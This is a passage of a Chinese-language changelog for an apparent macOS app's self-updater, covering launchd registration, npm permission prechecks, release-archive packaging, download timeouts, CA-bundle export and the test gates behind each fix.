哪两个数算出来的一起说出来。不声明长度仍退回那条 16 KiB/s 的保守值；配对控制保证这条判据既不是永远拒、
也不是永远放。

### Fixed — 一次被拒的 `enable` 会把这台机器的更新作业整个弄没

`registerAgent` 的顺序是"写新 plist → `bootout` 旧作业 → `bootstrap`"。bootstrap 被拒时旧代码只做一个动作：
把刚写的文件删掉、报一句失败——**而旧作业已经被它亲手卸了**。一次被拒的注册又刻意不写状态（§5），所以盘上
连痕迹都没有。本机 2026-10-03 就是这样看到的：状态最后一笔是 `enable → enabled`（那一趟成功且读回校验过），
15:27 时 `launchctl print` 里这个服务不存在、`~/Library/LaunchAgents` 里也没有 plist，自动更新静默消失。
现在这条分支先把写入前那份定义原样放回盘上、再 `bootstrap` 一次，并且说清落在哪一种：还原成功 ⇒ "这次要的
改动没生效，但之前的作业仍在跑"；还原也失败 ⇒ 明说"这台机器现在没有更新作业，必须再跑一次 `updater enable`"。
首次注册（没有旧定义）仍删掉那份加载不了的文件，不留半成品。

对照：`a refused re-registration puts the previous definition back instead of leaving no agent`（要求盘上留下
的是先前那份、`bootstrap` 真的跑了两次、mode 仍 0600）与 `a first registration that launchd refuses leaves no
unloadable file behind`。反向变异=删掉还原分支 ⇒ 前者红。

### Fixed — 装着 gpg 的机器被判定成"没装 gpg"，自动更新因此永远等人点头

gate 8 用 `spawnSync('gpg', …)` 问版本，而 launchd 给定时作业的 PATH 是 `/usr/bin:/bin:/usr/sbin:/sbin`，
Finder 起的 `.app` 也差不多。本机 gnupg 装在 `/opt/homebrew/bin/gpg`，于是每一次无人值守的检查都答
`signature-tool-missing`——那是**设计成要 consent 的结论**，所以自动更新在这台机器上根本不会自己走，
而句子还在说"gpg is not installed"（假话：装着，只是不在那条 PATH 上）。现在按
`GLASSPANE_GPG` → `PATH` → 三个已知前缀（Homebrew / /usr/local / MacPorts）的顺序找，找到就用绝对路径跑；
真找不到时句子说的是"试过哪几处、这次 PATH 是哪条"，补救写成人能直接做的一步。真机复核：把 PATH 压成
launchd 那份，`resolveGpgBinary` 返回 `/opt/homebrew/bin/gpg`，`gpg --version` 退 0。

## [1.6.1] — 2026-10-03

版本判断：两笔都是修复，没有任何对外契约变化——状态文件的字段一个都没动（新增的是 `message` 里的一句
话，而 `message` 本来就是自由文本）、退出码集合不变、CLI 参数不变。按本仓口径记 **patch**。

### Fixed — `updater check` 成功暂存之后打印的是一行空话

真机跑第一次成功的 1.6.0 换版时看到的：`check` 把所有闸都走通、状态写成 `staged`，终端上打出来的却是
`check: `——什么也没有。原因是这一句的两个来源（consent 说明、作者性说明）在"干净通过"时都是 `null`，
两个 null 拼起来是空串；而 CLI 用 `message ?? reason ?? 摘要` 选文本，`??` 只在意 `null`/`undefined`，
空串被当成"有内容"直接放行。**一行空的输出行读起来就是"这条命令没回答"**，而它偏偏是唯一带着下一步动作
（"去按安装更新"）的那条结果。两处一起修：干净暂存自己给出一句 `staged <ver> (sha256 <前 12 位>);
press "Install update" or run "updater apply"`，CLI 的选择规则改成"第一个**非空**"。
控制：`check.test.mjs` 断言那句话含版本号与摘要且指出下一步；`cli.test.mjs` 新增一条直接测渲染规则的
（空 message 必须落到状态摘要，绝不落到空串）。

### Changed — 发布说明不再写"source archive"

归档的内容变了（带着 `mcp-shell/dist` 与 `mcp-shell/schemas`），说明文字跟着改，并给 v1.6.0 的 Release
补上一条版本号说明：`1.5.1` 从未上 npm、`1.5.2` 从未对外存在过，npm 上是 `1.5.0 → 1.6.0` 的**有意跳过**。

## [1.6.0] — 2026-09-30

版本判断（记下来免得下次靠记忆争）：这一版里绝大多数是修复，但它**新增了对外的形状**——状态文件多一个
`runtime` 字段（schema 变化）、设置面板多一卡、`gp_diagnose` 多一段、`apply` 多一条对外可见的行为与一个新
错误码 `runtime-registration-pending`。按本仓既有口径「对外可见的契约变化按 minor 记」（1.3.0/1.4.0/1.5.0
都是这么定的），记 **1.6.0**。⚠ 本地曾有一笔 `release: 1.5.2`（939c592）**从未发布到任何地方**：§11 决定
之后版本号改判到这里，GitHub Release 与 npm 都不会出现 1.5.1/1.5.2 —— npm 从 1.5.0 直接跳 1.6.0，
是有意的跳过，不是漏发。


### Fixed — 发布作业自己也会假红：`tar -tzf | grep -q` 在 `pipefail` 下把成功的检查报成失败

v1.6.0 第一次跑发布作业，红在上一节新加的那道自证步骤上：

> ##[error]the release archive does not contain GlassPane-1.6.0/mcp-shell/dist/index.js

而归档里**确实有**那个条目（同一作业里 `make-release-archive.mjs` 自己打印的 `commands carried` 就在上面两行）。
原因是步骤写成 `tar -tzf … | grep -q "^…$"`：`grep -q` 命中即退出，GNU tar 随后被 SIGPIPE 打死，
`set -o pipefail` 把这条管道判成失败。**一条把自身成功报成失败的检查，比没有检查更坏**——它看起来像在守卫，
实际只是在随机挑一个条目喊狼来了，而这一条正是上一节为了"别再发一个装不动的 release"才加的。

改成 `node scripts/make-release-archive.mjs --verify <归档> <版本>`：判据与打包同一个作者，读的是同一个
`package.json` 的 `bin` 与 `kernel/schemas` 的清单（**推导出来的要求，不是手抄的列表**——加一条命令或一份
schema 不需要谁记得改第二处），逐条打印缺哪个、缺几个。测试侧两条：`--verify` 对刚打出来的归档必须全过，
对**真发过的那种纯源码归档**必须点名缺 `dist/index.js`；另一条断言工作流文本里不再出现拿"`tar … | grep`"
管道判成败的写法（断言前先把 `#` 注释行剔掉——我自己的注释正好引用了被禁写法，差点又造一次误红，那是本仓
记过的老形状）。`kernel/schemas` 空得像"没有要求"时也判拒绝：没有清单不等于通过。

控制：`release-archive.test.mjs` 5→7 条；变异 N8（verifier 永远报完整）、N9（步骤退回管道）、N10（空 schemas
视为无要求）各自变红——N10 第一次跑是绿的，因为当时还没有对应的对照，补上之后才成为一条被证明能红的闸。

### Fixed — 高危（真机测出）：发布归档没有 JS 构建产物，任何 1.5.x 机器都升不上来

chown 做完之后第一次真跑完整换版（1.5.0 → 1.5.1）拿到的是 `exit 4 / rolled-back`，句子读起来仍然自相矛盾：

> after 15000ms the daemon … does not report 1.5.1 (hello said "1.5.1") and the MCP layer answered
> "unavailable: glasspane-mcp could not run (ENOENT)" … the npm packages were glasspane-mcp removed again
> (this machine had none); glasspane-install removed again (this machine had none)

每一句都是真的，而合起来指向一个上一节没看见的事实：**发布归档是 `git archive HEAD`，纯源码**。
`mcp-shell` 的 `package.json` 说它的命令是 `dist/index.js`，而 `dist` 是构建产物、没被提交，于是
`apply` 在暂存树里 `npm pack` 出来的 tgz 只有三个条目（`package.json`/`LICENSE`/`README.md`，
`tar -tzf` 实测）。npm 装这种包**退 0**，`npm ls -g` 读回**版本也对**，跑起来才是 `ENOENT`。
上一节把 `tools/list` 挪到 npm 之后，只是让这道门在正确的位置拒绝；包的内容仍然是空的。

这不是"我这台机器的事"：`npm pack` 那段代码已经随 1.5.0/1.5.1 发出去了，所以**任何**用这条路安装的机器
都无法自动升到任何新版本。两个可选解法被否掉：

- 让 `apply` 在目标机上构建 JS（`npm ci && tsc && esbuild`）⇒ 每次自动更新都要联网装开发依赖、要跑
  esbuild 的平台 postinstall，把"更新"变成一次构建；
- 把两个 tgz 作为额外 release 资产、更新器改下载它们 ⇒ 已发布的 1.5.x 代码不认识新资产，旧机器照样升不上来。

采用的解法：**归档本身带着这两份构建产物**。新增 `scripts/make-release-archive.mjs`（用本仓自己的确定性
tar 写手：uid/gid/mtime 全 0、条目按 git 的字节序、gzip 无时间戳、打包两次比对字节才落盘），内容 = `git ls-files`
的树 + `mcp-shell/dist` + `mcp-shell/schemas`；缺任何一份构建产物就**拒绝发版**，声明了的 `bin` 不在树里也拒绝。
`release.yml` 因此先 `npm ci && npm run build && npm run bundle` 再调它，并加一步 `tar -tzf` 自证归档里确实有
那个命令。规格 §1 里"确定性源码 tarball"这句同步改口：可复现的承诺没有变，变的是**复现的是什么**。

updater 一侧补上与之对称的预检（`checkStagedNpmCommands`，§3.5 的 4d）：暂存树里 `package.json` 声明的命令
文件不存在 ⇒ **在备份之前** `deferred` + `release-payload-invalid`，句子里说清缺的是哪一个命令、这是发布产物
的问题。真机那次付出的代价是"换完 `.app`、重启完 daemon、装完全局包"之后才发现跑不起来；现在同样的事实只花
两次 `existsSync`。

控制：`updater/test/release-archive.test.mjs` 五条，其中一条是**整链**——临时 git 仓 → 真脚本 → 用更新器
自己的解包器解开 → `npm pack` → `npm install -g` 到临时 prefix → 那个命令真的跑得起来（这条就是当年能拦住
这个缺陷的那条测试）；`apply.test.mjs` 加两条（换版前的拒绝，带构建/kickstart/npm 三根引线；预检对"少一条"
"齐了""manifest 读不出"三种形状各自的答案）。反向变异：从必需产物清单里删掉 `mcp-shell/dist`、去掉条目排序、
删掉 `commandsReady` 那块、让缺文件的预检返回 `ok:true`，各自变红。

### Fixed — 下载有三个时钟，而兜底那一条不再当主判据；发布声明的资产长度成了一条要核对的断言

`updater` 的下载只有两个时钟：`stallMs`（逐段重置）与 `timeoutMs`（兜底总时长）。设计上兜底不该管事，实测里
它管了：24 MiB 那份 tarball 在一条**活着**的 ~26 KiB/s 链路上需要 966s，而兜底是 900s —— 于是"慢"被系统
判成了"坏"，报出去的还是那句不说到哪条时限、收到多少字节的形状。

现在是三条判据，各说各的话：

- `stallMs`：30s 一个字都没到 ⇒ 连接死了。
- `minRateBps`（默认 16 KiB/s，按窗口测量，连续两窗低于下限即拒）：活着，但慢到这一天都下不完。这个下限是
  **算出来的**——25,126,902 字节按 16 KiB/s 是 25 分钟，还在一天之内；按 4 KiB/s 是 100 分钟，下一次每日
  作业会先到来。句子说清测到多少、下限多少、按这个速度这份文件要多久、已经收到多少。
- `timeoutMs`：仍是兜底。差别在于响应声明了长度时它**只会被放宽、且放宽有顶**（`declared / minRateBps × 1.5`，
  上限 `maxCeilingMs` = 45min —— 按 16 KiB/s 算 1 GiB 的声明能换来 27 小时，那不是放宽而是把兜底取消掉），
  因为判"慢"的是上面那条；不声明长度就保持原值，"永远滴流"依然被它拦下。拦住下载的是哪一条，句子就打印
  那一条的秒数（放宽过之后照抄 `timeoutMs`＝报出一个没发生过的时限）。

另一条独立的收获：GitHub 的发布载荷本来就写着 `assets[].size`（v1.5.1 实测 tarball 25,126,902、SUMS 89，
与 CDN 的 `content-length` 一致），而这份代码从未读过它。现在收到的字节与它不符 ⇒ `release-payload-invalid`，
并且发生在**算哈希之前**。摘要闸替代不了它：`SHA256SUMS-<ver>.txt` 自己就是断言摘要的那份文件，它少一个字节
却仍写着正确那一行时，后面每一道闸都满意，而那已经不是发布所描述的东西了。载荷不带 `size`（镜像、旧 API）
不算失败，只是没有这条断言。

控制：`source.test.mjs` 23→27（按声明长度放宽预算才活得下来的一条，正是真机那个形状；crawling 的流被下限拦下
且句子说的是"太慢"；仅仅是不着急的流**要放行**——一条永远正确的"太慢"断言等于没有闸；放宽的顶单独一条，夹具
是**有限段**，因为"闸消失后这条用例挂住而不是变红"在 CI 上等于没有控制）、`check.test.mjs` 24→27（SUMS 短
一字节 / tarball 长度不符 / 什么都没声明）、`assets.test.mjs` 8→9。端到端夹具本身改为按真报文形状带上
`assets[].size`。10 条反向变异全红：删掉放宽那一行、拆掉那层夹取、拆掉速率下限、把停摆说成兜底、句子不写出
下限、速率取整成 "0 KiB/s"、删掉两处长度核对、把"没声明"当失败、资产闸丢掉 size。

### Fixed — 把全局包 chown 过来之后仍然换不了版：npm 那一层的三处真机形状（2026-10-01）

上一节那条预检的 remedy 本身是错的，而且错的方式很典型：它只看了 `<prefix>/lib/node_modules`，可
`npm install -g` 要写的其实是**两处**——包落进 `lib/node_modules`，命令软链进 `bin`。照 remedy 做完
`sudo chown -R "$(whoami)" /usr/local/lib/node_modules` 再跑，仍然死在
`EACCES: permission denied, symlink '../lib/node_modules/glasspane-install/cli.js' -> '/usr/local/bin/glasspane-install'`。
**一条修完仍然失败的 remedy 比没有 remedy 更糟**：用户做完了所有要求他做的事，却什么都没换来。预检现在两处都探、
remedy 里两处都点名。

真机那次跑还留下两件事，都在代码里而不是在日志里：

- **换上去的包没被取回来**：`glasspane-install` 在 `bin` 上被拒，`.app` 回滚、状态记 `rolled-back`，
  可 `npm ls -g` 里 `+-- glasspane-mcp@1.5.1` 一直留着——一层属于"没有任何东西在运行的那个版本"的全局转发
  代码。半途失败现在把已经装上的逐个取回（取不回来就在句子里点名哪一个、为什么）。
- **"这台机器原本没有这个包"被当成了无法撤销**：`readGlobalVersion` 的 `null` 同时表示"没有这个包"和
  "npm 没答上来"，所以撤销只能报"退不回去"。真机上需要的恰恰是后者那一半——没有 ⇒ 把它摘掉。接缝现在回答
  `{ok, versions, message}`：读不出来就**在任何一次 `npm install -g` 之前**拒绝（没有可退的版本就别改机器），
  读得出来而包缺席就是"这台机器原本没有"，撤销是卸载。四种 npm 真报文形状钉住这个判据：正常前缀 exit 0 带
  `dependencies`；**空前缀 exit 0 只回 `{"resolved": …}`、没有 `dependencies` 键**（缺键不是故障，否则每台新机器
  都被拒）；够不着的前缀 exit 254/236 却回一个**能 parse 的 JSON 错误封套**（"解析成功"≠"npm 答了清单"）；
  `lib` 不可读时 npm 仍回 exit 0 的空清单——那一类只有预检看得见。

还修了同一轮里两处我自己写坏的东西：read-back 那处撤销**没把 `uninstall` 接缝传进去**，于是默认值在作者机器上
真的执行了 `npm uninstall -g glasspane-mcp`（它把上面那个半装的 1.5.1 摘掉了，而没有任何测试要求过这件事）；
撤销的句子曾有两个作者，读回那一处对刚被摘掉的包说"已按记录的版本装回"——一个从未存在过的版本。现在
未接线的撤销一律回答"这条没接线，全局层没动"，句子由一处生成、逐包说清是"退回 X@1.4.0"还是"取回（原本没有）"，
`apply.test.mjs` 另把 `npm_config_prefix` 指向临时前缀并在最后一条用例证明那里一个字都没落下——`run` 计数拦不住
这类调用，它们走的是模块自己的 `spawnSync`。

门禁：11 条反向变异全红（删装前拒绝／把错误封套当清单／把空前缀当故障／"原本没有"再当无法撤销／read-back 少传
`uninstall`／注入 `install` 却给真 `restore`／一刀切的撤销句子／只探 `lib/node_modules`／半途失败不取回／
撤销失败清单点不出名字／被 stub 的 npm 层交回一条没有包名的修复记录）。`updater/test/apply.test.mjs` 47→56，
全套门禁 14 道绿（`node-updater` 343/343）。

### Added — §11 更新器自身的换版：这条机制终于能修好它自己


写这一节之前的事实很难看：上一节那四条真机高危（资产钉死、档案链接、CLI 参数、下载时钟）与 §9 那一整束，
全都住在 `updater/` 与 `installer/` 里，而每日作业跑的正是安装那趟 clone 里的那份代码
（`update-install.json` 的 `updaterCli`）——§3.5 换版只换 `.app` 与 npm 两个包，从不碰它。于是
**"修好更新器"的那次发版永远传不到用户机器上**：装了 1.5.0 的机器，其作业会继续用旧的钉死规则天天
`asset-host-unpinned`，而面板写着"已是最新"。一条机制救不了它自己，就等于没修。

契约（规格新增 §11，十条 + 判据↔测试表）：

- 落地来源只能是八道校验放过的那棵暂存树，且发生在暂存目录退场**之前**；落进
  `<状态根>/runtime/<版本>/` 这个**新版本目录**——绝不就地覆盖正在执行的那份代码，那是"半换的更新器"
  怎么诞生的。
- 指针（`update-install.json`）仍是"下一次谁跑"的唯一真源，换它必须走 `writePointer`
  （临时文件 + rename + 读回 + mode 校验）；落地/注册任何一步失败都要把指针**写回旧值**。
- **作业点名的是入口，不是版本**（本节落地时真机上实测出的形状问题，见下面"稳定入口"那一小节）：launchd 的
  定义里那条 CLI 永远是 `<状态根>/runtime/agent-entry.js`，它每次运行读指针再 exec 那一份。于是换版 = 写一个
  JSON 文件，向 launchd 重注册这件事每台机器只剩**一次**（把还在写死版本路径的旧定义迁到入口）。仍然必须用
  `launchctl print` 把**在册**参数读回来核对：核对的是"作业走入口"，不是"作业指这一版"——`agentVerified`
  的语义随之改，读不回来或仍指别的 ⇒ 这是一句要说出来的失败，不是"大概成功了"。
- 换版判定不被它改动：`.app` 与 npm 都换成了就是 `applied`、退出码仍是 0；更新器自己没换上是一条
  **长期可见的降级**（`runtime.status='failed'` + `code=runtime-stale` + 原话），与 `authorship`
  同一处理形状——不把一次不完美的成功洗成干净。
- 硬关（`GLASSPANE_UPDATE_DISABLE=1` 或状态里 `disabled=true`）时：代码与指针照刷（面板跑的就是指针那份），
  但**绝不注册作业**，并把这句留在状态里（`runtime.status='kept'`）。
- 只留还被指着的两代：新指针那一代、上一个指针值那一代，以及**在册作业自己那一代**（迁移窗口里才真实）。
  `launchctl print` 读不回作业时**一个都不删**并把原因写进 `runtime.detail`；世代新旧按版本号比较，
  不按字符串排（`1.9.0` 排在 `1.10.0` 前面会删掉正在被指的那一棵）。删除失败要说出来，不许报成"已清理"。
- `runtime` 进状态 schema（封闭枚举 `refreshed`/`failed`/`kept`/`skipped`，`additionalProperties:false`），
  updater、设置面板、`gp_diagnose` 三个读者都读；认不出的取值只能显示成"读不出"。
- ⚠ **旧安装仍需要一次人工重装，而且入口要两趟才站稳**：这一版之前的安装把指针钉在那趟浅 clone 上，而
  "会自己换版的更新器"本身要先进到机器上才能生效。**重跑一次 1.6.0 的安装程序**是最短路径：安装器 import
  的就是这份新代码，它注册作业时直接指向入口，从此每次换版都只是写一个 JSON 文件，不需要任何人工动作。
  如果一直不换安装、只靠自更新走，那第一趟（1.5.x 的代码跑的）仍按旧形状把作业指到
  `runtime/<新版本>/updater/cli.js`；第二趟由新代码跑，才把作业挪到入口上——而这一趟若是定时那一次，状态里
  会出现 `runtime.status='skipped'`（= 这台机器欠这一次迁移），人工做一次 `enable`（面板开关关掉再打开）即完成。
  这两条路径都写进规格 §11.11 与本节：别让任何人以为"升级之后什么都不用做"，也别把它说成"每一次都要人工"。

### Added — §11 的稳定入口：把"每次换版都要重注册"收成"每台机器一次"

上一小节第一版落地后，真机上跑出来的形状仍然要人工：plist 里写的是 `<版本>/updater/cli.js` 这样的路径，
所以**每一次换版都得重新注册一次**，而定时那一次不许注册自己（`bootout` 会拆掉正在换版的作业），
于是它只能记 `skipped`，等人下一次 `enable`。一台从不点「立即安装」的机器，§11 就永远不生效——
这条机制依旧修不了它自己。

现在作业跑的是 `<状态根>/runtime/agent-entry.js`：一个每次运行时读 `update-install.json`、exec 指针那份脚本、
退出码原样转达的入口（`updater/agent-entry.js`；指针缺失或读不回来时打印一行 JSON 拒绝并以 `3` 结束，
与"拒绝不是崩溃"的既有口径一致）。要点与代价：

- 换版向 launchd 做的那件事变成零：`runtime.status='refreshed'` 不再需要一次注册，`skipped` 收窄成
  一次性迁移，`updater apply` 的定时那一次从此不留待办。
- **回滚的边界跟着改**：`apply` 在交接之后才失败时只写回指针就够了；作业仍指别处或读不回来时，保守地让
  旧那份重注册一次（"不知道作业在跑什么"不等于"作业走入口"）。定时那一次与硬关的机器**都不注册**——
  前者就是那个正在回滚的作业，后者会把用户刚关掉的开关打开。这两条各有测试。
- `enable` 保住盘上已有的每日时刻（读 `StartCalendarInterval`，沿用；读不到才用默认值并说出来），
  否则每次迁移都把 `--hour 3` 的机器搬回 12:00。
- 入口文件是每日作业**按名字执行的状态根内文件**，因此它按发布树自己的字节写入、按字节读回比对通过才算落地，
  mode 0600、拒绝空文件与任何间接层；**读回不一致或 mode 不合就把那份文件收掉再说失败**——半份 ESM 照样
  解析，而作业点名的就是这个路径，留着它等于让定时任务每天执行一次"不知道是什么"的东西。这条已写进
  SECURITY 的中英两份与规格 §11.1。
- 迁移不做自动 `bootout`：旧定义还在写死版本路径的机器，第一次由**人工**那一次 `enable` 把它挪到入口上。


### Fixed — npm 的全局目录写不进去时，`apply` 现在在换任何东西之前就拒绝（真机实测抓出来的）

这台机器（作者自己的 Mac）上量的：`/usr/local/lib/node_modules` 属于 `root:wheel`，而这个账号从来没装过
GlassPane 的全局包（`npm ls -g` 是空的）。`apply` 的顺序是"换两个 `.app` → 重启 daemon 并握手 → 装 npm 两个包
→ §11 换更新器自己"，于是每次换版都走到第三步才炸 EACCES：**包已经换了、daemon 已经重启过了**，然后回退、
再重启一次，状态里留一句 `post-swap-failed`。定时作业每天同一分钟重演这件事，而版本永远落不下去——面板看到的
是"每天更新失败"，真实原因（这台机器需要一次 root 授权）从来没被说出来，因为说出来的永远是"装完包之后 npm 失败"。

现在换版之前先问一次 `npm config get prefix` 并对那一层做 `W_OK`：问不出、目录不存在、或写不进去 ⇒
`status=deferred` + `code=npm-prefix-unwritable`，**一个字节都没换、daemon 一次都没重启**，句子里点名写不进去
的那一层，并给出两条出路（把这层交给这个账号，或把 prefix 挪进家目录后重跑安装程序），同时说清这一步需要一个人
——`sudo` 不是 agent 能替用户按下去的那一下。

> 这一节当初的 remedy 少了一个目录，预检本身也少探了一个：见上面「把全局包 chown 过来之后仍然换不了版」。
> 留在这里不删，是因为"我自己给的出路修不完"这件事本身就是这一版要记住的形状。

新增控制两条（都有反向变异实测能红）：`checkNpmPrefix` 用真目录跑（含一次 `chmod 0500` 的"写不进去"），
序列那条把构建、kickstart、npm 全换成引线——预检失灵就会炸在任何一根上。

### Fixed — §3.3 的 MCP 读回问的是"还没装上的那个命令"：checkout 装出来的机器永远换不了版

`sudo chown` 之后第一次真跑 `apply`（1.5.0 → 1.5.1）拿到的答案是 `exit 4 / rolled-back`，句子读起来自相矛盾：

> after 15000ms the daemon … does not report 1.5.1 (hello said "1.5.1") and the MCP layer answered
> "unavailable: glasspane-mcp could not run (ENOENT)"; installed 1.5.1, running daemon reports "1.5.1";
> 1.5.0 was restored and verified

daemon 确实报了新版本；失败的是 §3.3 的另一半 —— 它要求**全局命令** `glasspane-mcp` 应答 `tools/list`。
而 checkout 形态的安装只跑过 `npm install`（workspaces），全局包是**本次 `apply` 在下一步才装的**：
那道门把"装它"这件事挡在了自己后面。所以任何这样装出来的机器，每一次自动更新都是"换 `.app` → 重启
daemon → `hello` 回新版本 → ENOENT → 回滚 → 再重启一次"，永远换不成，而且面板读到的是
"新版本装上了又退回去"这种没法据以行动的话。npm 全局列表实测为空（`npm ls -g`）是同一件事的另一面。

顺序改成三道，**两半都过才翻 `current`**（§3.3 的语义一点没松，只是把它挪到测得到东西的时刻）：
`hello` 版本 → npm 装 + 读回 → `tools/list`。第三条现在不过 ⇒ 除了 `.app`，**npm 层也按记账退回原版本**，
句子里点名退回了哪一版；只说"已回滚"会把人支去翻 `~/Applications`，而走样的其实是 npm。

npm 的撤销与安装走同一个注入接缝：这条是写测试时撞出来的——套序列用例注入了 `npm` 却没交代撤销，
默认值无条件 `npm install -g`，于是"测试"真的去动开发机的 `/usr/local/bin`（EACCES 才让它停下）。
测试自己也不许碰真机器。

两条新控制，各自跑了反向变异：把两半挪回 npm 之前 ⇒ 第一条红（并实测把 15 s 握手预算整个耗光后回滚，
正是真机那次的形状）；把撤销换成空 ⇒ 第二条红。

### Changed — §9.4 收紧：导出的束只留能锚链的证书

`filterToAnchors` 在写盘前只剔**显式声明 `CA:FALSE`** 的证书，理由是可证明无损：实测这类证书当唯一锚时
OpenSSL 直接 `INVALID_PURPOSE`，本来就锚不住任何链，留着只会让状态里"这台机器交了 N 张根"虚报。
读不出的、以及**没有声明 basicConstraints** 的一律保留——凭猜测剔掉一张旧根，坏掉的正是这条机制本身。
作者机器实测 158 + 5 = 163 张：161 张 `CA:TRUE`，2 张属于"没有声明"那一类，本机剔除数为 0；
`caRoots.certs` 从此是"node 真能用的张数"。

写这一条的时候被真机抓出一个我自己的 bug：`certificateBlocks` 把块之间的换行丢了，写出的束变成
`…END CERTIFICATE------BEGIN CERTIFICATE-----`，node 用一句 `PEM routines::bad end line` 把**整份**束拒收，
而张数、字节数、写后读回比对全都仍然报 163 —— 三道"看起来严格"的检查没有一个看得见这件事。
现在按三张**真证书**夹具（CA:TRUE / CA:FALSE / 无 basicConstraints，公钥部分，2036 年前有效）断言：留下的张数、
重组出来的块数、每块能被 `crypto.X509Certificate` 解析、块间必须有换行。把换行改回去 ⇒ 两条红（实测）。

新增测试：`updater/test/runtime.test.mjs`（12 条：落地/拒绝/世代清理/新代码自注册/读回在册参数/失败退回/
硬关不注册/缺指针不动手/指针写失败旧值仍在，其中真起子进程那条覆盖 argv 逐字、非零退出、无 JSON、被信号打死、
指到不存在的脚本五种答案）；`apply.test.mjs` 三条用**真实** `refreshRuntime`（只替换 spawn 与 launchctl 两个
外部事实）；`ca-bundle.test.mjs` 两条夹具测试。反向变异见 `/var/tmp/gp-iterate-gates/mutate_r12d.py`。


### Fixed — round 12 复审的落点：三处"桩替掉了生产那一段"、一句我编的 node 行为、四条没有读者的禁令

对 §9（根证书束）那一批改动起了一次全新视角的复审。它报的七条里，最有价值的不是具体缺陷，而是同一
个形状出现了三次：**测试注入的桩替掉了生产真正执行的那一段**，于是"全绿"证明的是桩的形状。

- **`defaultDeps` 此前一条测试都没有**（复审高-1/#3）。`enable`/`apply` 的测试全注入自己的桩，所以
  "注册进 plist 的那条自路径""TLS 失败 remedy 里的那个路径""探测用的 URL"这三件由默认依赖决定的事，
  没有任何一条闸。新增 `updater/test/default-deps.test.mjs`（3 条）：默认导出器收到的 `probeUrl` 必须是
  能进 `fetch` 的字符串且带上 release 路径（`[object Object]` 那一族在这里断掉）、默认可用性判据读的就是
  `<状态根>/ca-roots.pem` 那一个文件（换成 `/etc/protocols` 这种"读得到但不是束"也要红）、默认 fetcher 的
  失败 remedy 必须点名这台机器真有的那个绝对路径。反向变异 4 条，全红。
- **`new URL(import.meta.url).pathname` 不是文件系统路径**（复审高-1）：空格安装根会被编成 `%20`，
  三处（注册进 plist 的命令、恢复时起的那个子进程、"我是被直接调起的吗"）各自坏成不同的样子，其中前两处
  在单测里跑不到（跑一次就要动这台机器）。补 `updater/test/cli.test.mjs` 一条按源码形状闸住的用例：
  `import.meta.url` 只能经 `fileURLToPath` 变成路径，且三处计数守住。反向变异 3 条全红——其中入口判定那条
  同时把原来那条真机形状的空格子进程用例打红了，说明两处确实都在管同一件事。
- **§9.10 的恢复分支在两个生产消费者上都不触发**（复审高-2）：旧规则"调用方给了 `NODE_EXTRA_CA_CERTS`
  就不介入"把"他自己指的就是我们导出的那一份"这一常见情形也一起跳过了，于是终端里按 remedy 设过变量的
  人永远等不到恢复。规则改成**只有他指的 ≠ 我们导出的那一份**才不介入（方向仍归他，我们不代为取消他的信任），
  并补上注释里早已宣称存在、实际不存在的那条测试。
- **恢复写进状态的 `ok` 是没证据的**（复审高-3）：恢复路径上那次重导出 `probeUrl: null`，记下的 `ok` 只
  表示"文件写成了"，不表示"带着它连得上"。现在默认导出带探测，且 `onRecord` 失败时把"这次没能在状态里留下
  证据"原话写到 stderr（`--json` 那一行仍只由子进程写）。
- **`String.replaceAll(token, value)` 会展开替换串里的 `$&`**（复审 #5，与上面 plist 那条同源的另一半）：
  路径里含 `$&` 就把匹配到的 token 自己拼回去。`updater/lib/launchd.js` 的替换一律改函数形式。
- **一句我编的 node 行为**：1.5.0 起有三处注释与一句面板文案写着"空束会让 node 在启动期报错，
  比不带这个键更糟"。本机 node v26.4.0 实测（`updater/test/ca-bundle.test.mjs` 新增一条真起子进程的控制）：
  空文件、不存在的文件、空值三种都**正常启动**——不存在文件时只多一行 `Warning: Ignoring extra certs`，
  空值与没设完全一致。判据（0 张＝不可用）一个字没改，改的是理由：它的问题是**一张根都不加**，与被拦截的
  链上"什么都没设"的表现一模一样，而状态里会记成"束已导出"。面板那条"设成空串会崩"也换成实测事实
  （空串的真实危害是**静默覆盖操作者从终端带进来的那一份**，所以宁可根本不写这个键）。
- **给人看的句子里不留模板占位符**：`describeCa` 缺记录那句与 `describeTransportFailure` 无路径那句都印过
  `<stateRoot>/ca-roots.pem`，面板 `unavailable` 那卡显示过 `NODE_EXTRA_CA_CERTS=<那份束的路径>`，
  `probe-failed` 的 remedy 里那条 `add-trusted-cert` 用 `<root>` 当文件名。现在能拿到真路径就写真路径，
  拿不到就说清去 `updater status --json` 的 `stateRoot` 字段查；JS 与 Swift 各加一条守卫，
  反向变异（把占位符放回去）两条都红。
- **§9.4 的措辞按实测改准**："这台机器的管理员已经选择信任的那些根"是不成立的——`security find-certificate`
  列证书，**不看信任设置**。作者机器实测 158 + 5 = 163 张，161 张 `CA:TRUE`，另两张是 Apple 的本机服务身份
  （`com.apple.systemdefault`、`com.apple.kerberos.kdc`）；又实测一张自签 `CA:FALSE` 证书当唯一锚时
  OpenSSL 直接 `INVALID_PURPOSE`，所以那两张什么都没授予。真正要交代的是前者：被显式判为不信任的根、
  以及为别的目的躺在 `System.keychain` 里的 CA，都会对这个作业变成 node 的信任锚。这一条现在写在
  `SECURITY.md` §2.8（中英两份）、`updater/README.md` 与规格 §9.4 里，含"为什么不按信任设置过滤"的理由。
- **禁令有了读者**：规格里"不许改 `NODE_TLS_REJECT_UNAUTHORIZED`、不加 `--insecure`、不降级到 http"
  此前没有任何检查（全仓 grep 这些词零命中，包括守卫）。新增 `updater/test/trust-inversion.test.mjs`：
  带引号状态机的注释掩码（注释里的提及不算，且偏移量保住 ⇒ 行号指到文件里那一行）、发布路径上单独禁明文
  http、以及一条**自带能变红证明**的自测。反向变异 3 条（模式表清空、行号改假、把字符串里的 `//` 当注释）
  全红。
- **注册到盘上的那份 plist 从没被严格读过**（复审 #4③）：安装器侧的测试此前用 `plist.includes(...)`，
  且把导出与可用性判据都换成桩——桩给的 `path: null` 与"那个文件根本没写过"两件事一路放行，而作业实际指向
  一个不存在的文件。新增两条闸：真导出器（只注入 `security` 与探测子进程这两件外部事实）+ 真 writer 落盘 +
  真判据 + **python3 plistlib 严格解析**盘上那份 plist，断言 `EnvironmentVariables.NODE_EXTRA_CA_CERTS`
  就是那个真实存在、张数对得上的文件；另一条断言这台机器导不出束时**根本不出现这个键**。
  反向变异 4 条（不给束、给空串、指向没写过的路径、把判据改成"文件在不在"）全红。
- 规格 §9 的判据↔测试表补了 4 行（禁令的读者、盘上 plist 严格读、占位符禁令、node 实测行为），
